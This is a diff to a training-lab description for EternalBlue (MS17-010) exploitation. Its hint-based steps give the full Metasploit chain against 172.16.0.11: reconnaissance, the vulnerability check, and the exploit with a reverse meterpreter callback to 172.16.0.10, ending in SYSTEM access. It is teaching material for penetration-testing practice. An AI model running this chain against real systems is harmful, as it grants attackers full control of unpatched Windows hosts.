@@ -1,7 +1,7 @@
 # Lab 03 — EternalBlue Exploitation
 **File:** `src/laboratorios/laboratorio03.ts`
-**Date:** 2026-03-31
-**Difficulty:** Hard
+**Date:** 2026-04-02
+**Difficulty:** Medium
 **Category:** Network
 **Network Range:** 172.16.0.0/24
 **Target:** 172.16.0.11
@@ -11,16 +11,26 @@
 ## Steps
 
 ### 01 — Network Reconnaissance
-Discover hosts: `arp-scan 172.16.0.0/24`
+**Text:** Discover hosts on the network
+**Hint 1 (tool):** Use arp-scan
+**Hint 2 (command):** `arp-scan 172.16.0.0/24`
 
 ### 02 — Port Scanning
-Identify services: `nmap -sV 172.16.0.11`
+**Text:** Identify the services running on the target
+**Hint 1 (tool):** Use nmap
+**Hint 2 (command):** `nmap -sV 172.16.0.11`
 
 ### 03 — Verify Vulnerability
-Execute: `msfconsole` → `use auxiliary/scanner/smb/smb_ms17_010` → `set rhosts 172.16.0.11` → `run`
+**Text:** Check if the target is vulnerable to MS17-010
+**Hint 1 (tool):** Use Metasploit modules
+**Hint 2 (command):** `msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run`
 
 ### 04 — Exploit EternalBlue
-Execute: `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS 172.16.0.11` → `set LHOST 172.16.0.10` → `exploit`
+**Text:** Exploit the MS17-010 vulnerability to gain access
+**Hint 1 (tool):** Use the EternalBlue exploit
+**Hint 2 (command):** `use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit`
 
 ### 05 — Verify SYSTEM Access
-meterpreter: `getuid`
+**Text:** Verify that you have obtained SYSTEM privileges
+**Hint 1 (tool):** Check your user id in meterpreter
+**Hint 2 (command):** `getuid`
